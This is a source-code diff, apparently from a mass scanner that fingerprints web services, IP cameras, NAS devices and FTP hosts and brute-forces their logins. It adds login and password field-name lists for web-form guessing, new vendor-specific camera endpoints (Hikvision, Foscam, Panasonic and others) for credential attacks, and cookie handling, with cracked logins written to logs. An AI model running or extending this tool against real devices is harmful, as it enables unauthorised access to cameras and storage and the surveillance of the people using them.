+			stt->doEmitionFoundData("[WF]: GetParam - Cannot retrieve field.");				
 		};
 	};
 };
 
-static const std::string arrUser[] = {"user", "usr", "username", "login", "lgn", "account", "acc", "param1", "param3", "id", "A1", "uname"};
+static const std::string arrUser[] = {"user", "usr", "username", "login", "lgn", "account", "acc", "param1", "param3", "id", "A1", "uname", "mail", "name"};
 vector<std::string> vecUser (arrUser, arrUser + sizeof(arrUser) / sizeof(arrUser[0]) );
 static const std::string arrPass[] = {"pass", "pw", "password", "code", "param2", "param4", "secret", "login_p", "A2", "admin_pw", "pws"};
 vector<std::string> vecPass (arrPass, arrPass + sizeof(arrPass) / sizeof(arrPass[0]) );
@@ -898,14 +1026,18 @@ char *_getAttribute(char *str, char *attrib)
 	{
 		char res[1024] = {0};
 		char *ptrStart = strstri(str, attrib);
-		char *ptrEnd = FindFirstOcc(ptrStart, "\r\n");
-		int szAt = strlen(attrib);
-		int sz = ptrEnd - ptrStart - szAt;
+		char *ptrEnd = _findFirstOcc(ptrStart, "\r\n");
+		if(ptrEnd != NULL)
+		{
+			int szAt = strlen(attrib);
+			int sz = ptrEnd - ptrStart - szAt;
 
-		if(sz != 0 && sz < 1024) strncpy(res, ptrStart + szAt, sz);
+			if(sz != 0 && sz < 1024) strncpy(res, ptrStart + szAt, sz);
+			else return "";
+
+			return res;
+		}
 		else return "";
-
-		return res;
 	}
 	else return "";
 };
@@ -964,13 +1096,15 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 
 	char b[16] = {0};
 	char methodVal[128] = {0};
-	char actionVal[128] = {0};
+	char actionVal[512] = {0};
 	char userVal[128] = {0};
 	char passVal[128] = {0};
 	char frmBlock[4096] = {0};
 	char *fBlock = strstri(buff, "<form ");
 	char formVal[128] = {0};
 	int fbsz = 0;
+	char tport[16] = {0};
+	strcpy(tport, itoa(port, b, 10));
 	std::vector<std::string> inputVec;
 	if(fBlock != NULL)
 	{
@@ -989,7 +1123,7 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 		};
 
 		_getFormVal(frmBlock, methodVal, "method");
-		_getFormVal(frmBlock, actionVal, "action");
+		_getFormVal(frmBlock, actionVal, "action", path);
 		if(actionVal[0] == '.')
 		{
 			char tmpBuff[512] = {0};
@@ -1015,10 +1149,7 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 			{
 				insz = inptPtrEnd - inptPtr1 + 1;
 				strncpy(tempInptStr, inptPtr1, (insz < 128 ? insz : 128));
-				if(strstri(tempInptStr, "text") != NULL || strstri(tempInptStr, "password") != NULL )
-				{
-					inputVec.push_back(std::string(tempInptStr));
-				};
+				inputVec.push_back(std::string(tempInptStr));
 				inptPtr1 = strstri(inptPtrEnd, "<input ");
 			}
 			else break;
@@ -1032,11 +1163,15 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 		else
 		{
 			stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: No text/password fields found.");							
+			fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, "NULL", "NULL", comment, cp, tclass);
+			putInFile(flag, ip, tport, recd, title, hl, cp);
 		};
 	}
 	else
 	{
 		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find form block.");
+		fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, "NULL", "NULL", comment, cp, tclass);
+		putInFile(flag, ip, tport, recd, title, hl, cp);
 	};
 	
 	if(strlen(methodVal) == 0)
@@ -1094,8 +1229,6 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 
 	if(inputVec.size() > 0)
 	{
-		char tport[16] = {0};
-		strcpy(tport, itoa(port, b, 10));
 		if(strlen(userVal) != 0 && strlen(passVal) != 0)
 		{
 			Connector con;
@@ -1112,7 +1245,7 @@ void _specWFBrute(char *ip, int port, char *hl, char *buff, int flag, char *path
 		else
 		{
 			stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find user/pass field.");		
-			fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, "?", "?", "Unknown webform", cp, tclass);
+			fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), title, "", "", "UnknownWebform", cp, tclass);
 			putInFile(flag, ip, tport, recd, title, hl, cp);
 		};
 	};
@@ -1138,7 +1271,7 @@ void _specWEBIPCAMBrute(char *ip, int port, char *hl, char *finalstr, int flag, 
 		fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");	
 	};
 };
-void _specBrute(char *ip, int port, char *hl, char *finalstr, int flag, char *path, char *comment, char *tclass, char *cp, int recd, char *data)
+void _specBrute(char *cookie, char *ip, int port, char *hl, char *finalstr, int flag, char *path, char *comment, char *tclass, char *cp, int recd, char *data)
 {
 	OnLiner = 1;
 	lopaStr lps;
@@ -1152,15 +1285,14 @@ void _specBrute(char *ip, int port, char *hl, char *finalstr, int flag, char *pa
 	strcat(tport, itoa(port, b, 10));
 	Connector con;
 
-	if(strcmp(comment, "[DIGEST]") == 0) lps = con._BALobby(ip, port, path, "[DIGEST]", data);
-	else lps = con._BALobby(ip, port, path, "[NORMAL]", "");
+	if(strcmp(comment, "[DIGEST]") == 0) lps = con._BALobby(cookie, ip, port, path, "[DIGEST]", data);
+	else lps = con._BALobby(cookie, ip, port, path, "[NORMAL]", "");
 
 	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
 	{
 		_specFillerBA(hl, ip, tport, finalstr, lps.login, lps.pass, flag);
 
 		fillGlobalLogData(ip, hl, tport, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");
-		
 	};
 
 	ZeroMemory(temp, strlen(temp));
@@ -1203,7 +1335,7 @@ const char *GetTitle(char* str)
 				int y = str3 - str2;
 				if(y > 256)
 				{ 
-					strcpy(finalstr, "[Title: Strange title]");
+					strcpy(finalstr, "[Strange title]");
 				}
 				else
 				{
@@ -1220,7 +1352,7 @@ const char *GetTitle(char* str)
 		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
 		else 
 		{
-			strcat(finalstr, "[Title: Corrupted title]");
+			strcat(finalstr, "[Corrupted title]");
 			return finalstr;
 		};
 		int hm = (int)(secondStr - firstStr);
@@ -1261,7 +1393,7 @@ const char *GetTitle(char* str)
 		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
 		else
 		{
-			strcpy(finalstr, "[Title: Corrupted title]");
+			strcpy(finalstr, "[Corrupted title]");
 			return finalstr;
 		};
 		int hm = (int)(secondStr-firstStr);
@@ -1288,7 +1420,7 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 	{
 		if(gNegDebugMode)
 		{
-			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + "\"><font color=\"#0084ff\">" + QString(ip) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit("404 Not Found").toHtmlEscaped() + "\"");
+			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(p) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(p) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit("404 Not Found").toHtmlEscaped() + "\"");
 		};
 		++Filt;
 		return -1;
@@ -1331,25 +1463,28 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 			strncpy(passSSH, ptrl1 + 1, lpsz);
 			fillGlobalLogData(ip, hl, itoa(p, b, 10), std::to_string((long double)recd).c_str(), "[SSH service]", loginSSH, passSSH, "NULL", "UTF-8", "SSH");
 			
-
 #pragma region QTGUI_Area
 			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
 #pragma endregion
+			return -1;
 	};
-	lopaStr lps;		
-	PathStr ps;
-	strcpy(ps.ip, ip);
-	ZeroMemory(ps.headr, sizeof(ps.headr));
-	ZeroMemory(ps.path, sizeof(ps.path));
+
+	lopaStr lps;
 	ZeroMemory(lps.login, sizeof(lps.login));
 	ZeroMemory(lps.pass, sizeof(lps.pass));
 	ZeroMemory(lps.other, sizeof(lps.other));
+
+	PathStr ps;
+	ps.port = p;
+	strcpy(ps.ip, ip);
+	ZeroMemory(ps.headr, sizeof(ps.headr));
+	ZeroMemory(ps.path, sizeof(ps.path));
+
 	char finalstr[TITLE_MAX_LENGTH] = {0};
-	char cp[32] = {0};
-	strcpy(cp, "utf-8");	
 	char port[32] = {0};
-	strcpy(port, itoa(p, b, 10));
 	int flag = 0;
+	char cp[32] = {0};
+	strcpy(cp, "utf-8");
 
 	flag = ContentFilter(buffcpy, p, ip);
 
@@ -1357,12 +1492,14 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 	
 	strcpy(ps.headr, GetTitle(buffcpy));
 	ps.flag = flag;
+
 	char pps[256] = {0};
 	strcpy(pps, "/");
 
 	std::vector<std::string> redirStrLst;
 	char rBuff[65536] = {0};
 	strncpy(rBuff, buffcpy, 65535);
+	char cookie[1024] = {0};
 	if(flag == 0 || flag == 3 || flag == 7 )
 	{
 		int rh = _header(ip, p, buffcpy, lx, &ps, &redirStrLst, rBuff);
@@ -1373,12 +1510,15 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 			strcat(finalstr, ps.headr);
 			p = ps.port;
 			strcpy(ip, ps.ip);
+			strcpy(cookie, ps.cookie);
 		};
 		
 		int sz = strlen(ps.path);
 		strncpy(pps, ps.path, (sz < 256 ? sz : 256));
 	};
-	if(strlen(finalstr) != 0) strcat(finalstr, " -> ");
+
+	strcpy(port, itoa(p, b, 10));
+
 	if(strstr(finalstr, ps.headr) == NULL) strcat(finalstr, ps.headr);
 	if(strstr(finalstr, "Error - Bad Address") != NULL) flag = 5;
 	else if(flag == -1 || flag == 6 || strstr(finalstr, "[IGNR_ADDR]") != NULL) return -1;
@@ -1394,17 +1534,16 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 		char log[2048] = {0};
 		char logEmit[2048] = {0};
 
-		strcpy(logEmit, "[FTP] ");
-		strcpy(log, "[FTP] <font color=\"#0f62e2\">");
+		strcpy(logEmit, "[FTP]:");
+		strcpy(log, "[FTP]:<font color=\"#0f62e2\">");
 		strcat(log, ip);
+		strcat(log, ":");
 		strcat(log, port);
 		strcat(log, "</font>");
 		strcat(log, "; Received: ");
 		strncat(log, std::to_string((long double)recd).c_str(), 100);
 				
-		BConInc();
-		lps = con._ftpBrute(ip, p, &ps);
-		BConDec();
+		lps = con._FTPLobby(ip, p, &ps);
 
 		if(strstr(lps.other, "ROUTER") != NULL)
 		{
@@ -1504,87 +1643,119 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 	}
 	else if(flag == 21) //Eyeon
 	{
-		_specBrute(ip, p, hl, "Eyeon Camera", flag, "/user/index.htm", "Eyeon Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Eyeon Camera", flag, "/user/index.htm", "Eyeon Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 22) //IP Camera control
 	{
-		_specBrute(ip, p, hl, "IP camera Control webpage", flag, "/main/cs_motion.asp", "IP Camera Control", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "IP camera Control webpage", flag, "/main/cs_motion.asp", "IP Camera Control", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 23) //Network Camera BB-SC384
 	{
-		_specBrute(ip, p, hl, "Network Camera BB-SC384", flag, "/live/index2.html", "Network Camera BB-SC384", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Network Camera BB-SC384", flag, "/live/index2.html", "Network Camera BB-SC384", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 24) //Network Camera VB-M40
 	{
-		_specBrute(ip, p, hl, "Network Camera VB-M40", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-M40", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Network Camera VB-M40", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-M40", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 25) //Panasonic WTFISTHISAreaOMGIDONTEVEN-camera
 	{
-		_specBrute(ip, 60002, hl, "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", flag, "/SnapshotJPEG", "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, 60002, hl, "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", flag, "/SnapshotJPEG", "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 26) //Sony Network Camera
 	{
-		_specBrute(ip, p, hl, "Sony Network Camera", flag, "/oneshotimage?", "Sony Network Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Sony Network Camera", flag, "/oneshotimage?", "Sony Network Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 27) //UA Network Camera
 	{
-		_specBrute(ip, p, hl, "UA Network Camera", flag, "/webs.cgi?", "UA Network Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "UA Network Camera", flag, "/webs.cgi?", "UA Network Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 28) //Network Camera VB-M40
 	{
-		_specBrute(ip, p, hl, "Network Camera VB-??", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-??", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Network Camera VB-??", flag, "/-wvhttp-01-/open.cgi?", "Network Camera VB-??", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 29) //LG Smart IP Device
 	{
-		_specBrute(ip, p, hl, "LG Smart IP Device Camera", flag, "/digest.php", "LG Smart IP Device Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "LG Smart IP Device Camera", flag, "/digest.php", "LG Smart IP Device Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 30) //NAS
 	{
-		_specBrute(ip, p, hl, "NAS", flag, "/cgi-bin/data/viostor-220/viostor/viostor.cgi", "NAS", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "NAS", flag, "/cgi-bin/data/viostor-220/viostor/viostor.cgi", "NAS", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 31) //ip cam
 	{
-		_specBrute(ip, p, hl, "IP CAMERA", flag, "/check_user.cgi", "IP CAMERA", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "IP Camera", flag, "/check_user.cgi", "IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 32) //IPC WEB ip cam
 	{
-		_specWEBIPCAMBrute(ip, p, hl, "[IPC] WEB IP CAMERA", flag, "[IPC] WEB IP CAMERA", "WEB Authorization", cp, recd, "IPC");
+		_specWEBIPCAMBrute(ip, p, hl, "[IPC] WEB IP Camera", flag, "[IPC] WEB IP Camera", "WEB Authorization", cp, recd, "IPC");
 	}
 	else if(flag == 33) //GEOvision ip cam
 	{
-		_specWEBIPCAMBrute(ip, p, hl, "[GEO] WEB IP CAMERA", flag, "[GEO] WEB IP CAMERA", "WEB Authorization", cp, recd, "GEO");
+		_specWEBIPCAMBrute(ip, p, hl, "[GEO] WEB IP Camera", flag, "[GEO] WEB IP Camera", "WEB Authorization", cp, recd, "GEO");
+	}
+	else if(flag == 34) //Hikvision ip cam
+	{
+		_specBrute(ps.cookie, ip, p, hl, "[Hikvision] IP Camera", flag, "/PSIA/Custom/SelfExt/userCheck", "[Hikvision] IP Camera", "Basic Authorization", cp, recd, "");
+	}
+	else if(flag == 35) //EasyCam
+	{
+		_specWEBIPCAMBrute(ip, p, hl, "[EasyCam] WEB IP Camera", flag, "[EasyCam] WEB IP Camera", "WEB Authorization", cp, recd, "EasyCam");
+	}
+	else if(flag == 36) //Panasonic Cam
+	{
+		_specBrute(ps.cookie, ip, p, hl, "[Panasonic] IP Camera", flag, "/config/index.cgi", "[Panasonic] IP Camera", "Basic Authorization", cp, recd, "");
+	}
+	else if(flag == 37) //Panasonic Cam
+	{
+		_specBrute(ps.cookie, ip, p, hl, "[Panasonic] IP Camera", flag, "/view/getuid.cgi", "[Panasonic] IP Camera", "Basic Authorization", cp, recd, "");
+	}
+	else if(flag == 38) //Foscam
+	{
+		_specWEBIPCAMBrute(ip, p, hl, "[Foscam] IP Camera", flag, "[Foscam] IP Camera", "Basic Authorization", cp, recd, "Foscam");
+	}
+	else if(flag == 39) //EagleEye
+	{
+		_specBrute(ps.cookie, ip, p, hl, "[EagleEye] IP Camera", flag, "/cgi-bin/guest/Video.cgi?", "[EagleEye] IP Camera", "Basic Authorization", cp, recd, "");
+	}
+	else if(flag == 40) //Network Camera VB-C??
+	{
+		_specBrute(ps.cookie, ip, p, hl, "[Network Camera VB-C??] IP Camera", flag, "/admin/index.shtml?", "[Network Camera VB-C??] IP Camera", "Basic Authorization", cp, recd, "");
+	}
+	else if(flag == 41) //AVIOSYS-camera
+	{
+		_specWEBIPCAMBrute(ip, p, hl, "[AVIOSYS] IP Camera", flag, "[AVIOSYS] IP Camera", "Basic Authorization", cp, recd, "AVIOSYS");
 	}
 	else if(flag == 20) //AXIS Camera
 	{
-		_specBrute(ip, p, hl, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "AXIS Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "AXIS Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 19) //reecam cameras
 	{
-		_specBrute(ip, p, hl, "Reecam (network camera)", flag, "/videostream.cgi", "ReeCam camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Reecam (network camera)", flag, "/videostream.cgi", "ReeCam camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 18) //linksys camera
 	{
-		_specBrute(ip, p, hl, "Linksys camera", flag, "/img/main.cgi", "Linksys camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Linksys camera", flag, "/img/main.cgi", "Linksys camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 17) //Real-time IP Camera Monitoring System
 	{
-		_specBrute(ip, p, hl, "Real-time IP Camera Monitoring System", flag, "/live.htm", "Real-time IP Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Real-time IP Camera Monitoring System", flag, "/live.htm", "Real-time IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 11) 
 	{
-		_specBrute(ip, p, hl, "Netwave IP Camera", flag, "/videostream.cgi", "Netwave IP Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "Netwave IP Camera", flag, "/videostream.cgi", "Netwave IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 12) 
 	{
-		_specBrute(ip, p, hl, "IP Camera", flag, "/view/view.shtml?videos=", "IP Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "IP Camera", flag, "/view/view.shtml?videos=", "IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 13) 
 	{
-		_specBrute(ip, p, hl, "IP Camera", flag, "/eng/view/indexjava.html", "IP Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "IP Camera", flag, "/eng/view/indexjava.html", "IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 14) 
 	{
-		_specBrute(ip, p, hl, "IP Camera", flag, "/rdr.cgi", "IP Camera", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, "IP Camera", flag, "/rdr.cgi", "IP Camera", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 15) //For HFS
 	{
@@ -1594,40 +1765,36 @@ int Lexems::_filler(int p, char* buffcpy, char* ip, int recd, Lexems *lx, char *
 		OnLiner = 1;
 		++AnomC1;
 		
-		strcpy(log, "[HFS] <font color=\"#ff6600\">");
+		strcpy(log, "[HFS]:<font color=\"#ff6600\">");
 		strcat(log, hl);
 		strcat(log, " :: </font><a href=\"http://");
 		strcat(log, ip);
+		strcat(log, ":");
 		strcat(log, port);
 		strcat(log, "/\"><span style=\"color: #a1a1a1;\">");
 		strcat(log, ip);
+		strcat(log, ":");
 		strcat(log, port);
-		strcat(log, "</span></a><font color=\"#0084ff\"> Title: </font><font color=\"#ff9600\">");
+		strcat(log, "</span></a><font color=\"#0084ff\"> T: </font><font color=\"#ff9600\">");
 		strcat(log, finalstr);
 		strcat(log, " Pass: "); 
-		lps = con._BALobby(ip, p, "/~login", "[NORMAL]", "");
+		lps = con._BALobby(ps.cookie, ip, p, "/~login", "[NORMAL]", "");
 		strcat(log, lps.login);
 		strcat(log, ":");
 		strcat(log, lps.pass);
 		strcat(log, "</font>");
-
-
 		fillGlobalLogData(ip, hl, port, std::to_string((long double)recd).c_str(), finalstr, lps.login, lps.pass, "HFS-FTP", cp, "Basic Authorization");
-		
-
 		fputsf (ip, port, log , flag, "HFS");
-#pragma region QTGUI_Area
 		stt->doEmitionFoundData(QString::fromLocal8Bit(log));
-#pragma endregion
 		ZeroMemory(temp, strlen(temp));
 	}
 	else if(flag == 1) 
 	{
-		_specBrute(ip, p, hl, finalstr, flag, pps, "[NORMAL]", "Basic Authorization", cp, recd, "");
+		_specBrute(ps.cookie, ip, p, hl, finalstr, flag, pps, "[NORMAL]", "Basic Authorization", cp, recd, "");
 	}
 	else if(flag == 101) 
 	{
-		_specBrute(ip, p, hl, finalstr, flag, pps, "[DIGEST]", "Basic Authorization", cp, recd, buffcpy);
+		_specBrute(ps.cookie, ip, p, hl, finalstr, flag, pps, "[DIGEST]", "Basic Authorization", cp, recd, buffcpy);
 	}
 	else if(flag == 10) 
 	{
@@ -1856,7 +2023,10 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 				ps->port = tempPort;
 				return ls->flag;			
 			};
+			strcat(ps->headr, " -> ");
+			strcat(ps->headr, GetTitle(cstr.lowerBuff));
 			ls->_header(tempIP, tempPort, cstr.lowerBuff, ls, ps, redirStrLst, buff);
+			ps->port = tempPort;
 			if(strlen(cstr.lowerBuff) < 1)
 			{
 				ps->flag = 3;
@@ -1868,9 +2038,6 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 				ps->flag = 0;
 			};
 
-			strcat(ps->headr, " -> ");
-			strcat(ps->headr, GetTitle(cstr.lowerBuff));
-			ps->port = tempPort;
 			delete []cstr.lowerBuff;
 		}
 		else
@@ -2069,8 +2236,11 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 			ps->port = tempPort;
 			return ls->flag;			
 		};
+		strcat(ps->headr, " -> ");
+		strcat(ps->headr, GetTitle(cstr.lowerBuff));		
 		ls->_header(tempIP, tempPort, cstr.lowerBuff, ls, ps, redirStrLst, buff);
-		
+		ps->port = tempPort;
+
 		if(strlen(cstr.lowerBuff) < 1)
 		{
 			ps->flag = 3;
@@ -2081,11 +2251,8 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 			ls->flag = 0;
 			ps->flag = 0;
 		};
-				
-			strcat(ps->headr, " -> ");
-			strcat(ps->headr, GetTitle(cstr.lowerBuff));
-			delete []cstr.lowerBuff;		
-			ps->port = tempPort;
+
+			delete []cstr.lowerBuff;
 		}
 		else
 		{
@@ -2181,7 +2348,10 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 			ps->port = tempPort;
 			return ls->flag;			
 		};
+		strcat(ps->headr, "->");
+		strcat(ps->headr, GetTitle(cstr.lowerBuff));
 		ls->_header(ip, port, cstr.lowerBuff, ls, ps, redirStrLst, buff);
+		ps->port = tempPort;
 		if(strlen(cstr.lowerBuff) < 1)
 		{
 			ps->flag = 3;
@@ -2193,10 +2363,7 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 			ps->flag = 0;
 		};
 	
-		strcat(ps->headr, "->");
-		strcat(ps->headr, GetTitle(cstr.lowerBuff));
 		delete []cstr.lowerBuff;
-			ps->port = tempPort;
 		}
 		else
 		{
@@ -2272,7 +2439,10 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 			ps->port = tempPort;
 			return ls->flag;			
 		};
+			strcat(ps->headr, " -> ");
+			strcat(ps->headr, GetTitle(cstr.lowerBuff));
 			ls->_header(ip, port, cstr.lowerBuff, ls, ps, redirStrLst, buff);
+			ps->port = tempPort;
 
 			if(strlen(cstr.lowerBuff) < 1)
 			{
@@ -2285,10 +2455,7 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 				ps->flag = 0;
 			};
 
-			strcat(ps->headr, " -> ");
-			strcat(ps->headr, GetTitle(cstr.lowerBuff));
 			delete []cstr.lowerBuff;
-			ps->port = tempPort;
 		}
 		else
 		{
@@ -2301,38 +2468,6 @@ int redirectReconnect(char *cookie, char *ip, int port, char *str, Lexems *ls, P
 		
 	return -1;
 };
-char *_ValidateRedStr(char *str, char *oldResStr)
-{
-	char toldResStr[512] = {0};
-	strcat(toldResStr, " ");
-	strncat(toldResStr, oldResStr, 510);
-	char *temp1 = strstr(str, toldResStr);
-	char redStr[512] = {0};
-	if(temp1 != NULL)
-	{
-		char *temp2 = FindFirstOcc(temp1 + 1, "\"'");
-		char *temp3 = FindFirstOcc(temp2 + 1, ";\n");
-		int sz = temp3 - temp2 - 2;
-		char tRedStr[512] = {0};
-		sz = (sz < 0?0:sz);
-		strncpy(tRedStr, temp2 + 1, (sz < 511 ? sz : 511));
-
-		if(strstr(tRedStr, "+") != NULL)
-		{
-			int iC = 0;
-			for(int i = 0; i < sz; ++i)
-			{
-				if(tRedStr[i] != '+' && tRedStr[i] != '"' && tRedStr[i] != '\'' && tRedStr[i] != ';' && tRedStr[i] != '\n' && tRedStr[i] != ' ') 
-				{
-					redStr[iC] = tRedStr[i];
-					++iC;
-				};
-			};
-		} else strcpy(redStr, tRedStr);
-	};
-	return redStr;
-};
-
 void _getPopupTitle(PathStr *ps, char *str)
 {
 	char res[32] = {0};
@@ -2361,14 +2496,73 @@ void _getPopupTitle(PathStr *ps, char *str)
 	};
 
 	strcat(ps->headr, "]"); 
+};		
+void _getLinkFromJSLocation(char *dataBuff, char *str, char *tag, char *ip, int port)
+{
+	char delim[1] = {0};
+	char *ptr1 = strstr(str, tag);
+	if(ptr1 != NULL)
+	{
+		char *ptr2 = _findFirstOcc(ptr1, "=(");
+		char *ptrSemi = _findFirstOcc(ptr1, ".;");
+		if(ptr2 != NULL && ptrSemi != NULL)
+		{
+			int sz = ptrSemi - ptr2;
+			if(sz > 2)
+			{
+				char *ptrQuote1 = _findFirstOcc(ptr2, "\"'");
+				if(ptrQuote1 != NULL)
+				{
+					delim[0] = ptrQuote1[0];
+					char *ptrQuote2 = strstr(ptrQuote1 + 1, delim);
+					if(ptrQuote2 != NULL)
+					{
+						int lsz = ptrQuote2 - ptrQuote1 - 1;
+						char link[512] = {0};
+						if(lsz < 511)
+						{
+							if(ptrQuote1[1] != '/') 
+							{
+								strcpy(dataBuff, "/");
+								strncat(dataBuff, ptrQuote1 + 1, lsz);
+							}
+							else strncpy(dataBuff, ptrQuote1 + 1, lsz);
+						};
+					};
+				};
+			};
+		}
+		else
+		{
+			stt->doEmitionRedFoundData("[JSLocator] _findFirst failed [" + QString(ip) + ":" + QString::number(port) + "]");			
+		};
+	};
 };
-
+void _getJSCookie(char *dataBuff, char *str, char *ip, int port)
+{
+	char *ptr1 = strstri(str, "document.cookie");
+	if(ptr1 != NULL)
+	{
+		char *ptr2 = _findFirstOcc(ptr1, "\"'");
+		if(ptr2 != NULL)
+		{
+			char *ptr3 = _findFirstOcc(ptr2 + 1, "\"'");
+			if(ptr3 != NULL)
+			{
+				int sz = ptr3 - ptr2 - 1;
+				if(sz < 1024) strncpy(dataBuff, ptr2 + 1, sz);
+				else
+				{
+					stt->doEmitionRedFoundData("[_getJSCookie] Cookie exceeds max value [" + QString(ip) + ":" + QString::number(port) + "]");					
+				};
+			};
+		};
+	};
+};
 int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std::vector<std::string> *redirStrLst, char *rBuff)
 {
 	std::string redirectStr = "";
-	char cookie[1024] = {0};
-	strncpy(cookie, _getAttribute(str, "Set-Cookie:"), 1024);
-
+	if(strstr(str, "Set-Cookie:") != NULL) strncpy(ps->cookie, _getAttribute(str, "Set-Cookie:"), 1024);
 
 #pragma region Prechecks
 	if(strstr(str, "[IGNR_ADDR]") != NULL) 
@@ -2412,7 +2606,7 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 		
 		) 
 	{ 
-		strcpy(ps->headr, "[IP Camera detected.]");
+		strcpy(ps->headr, "[IP Camera detected]");
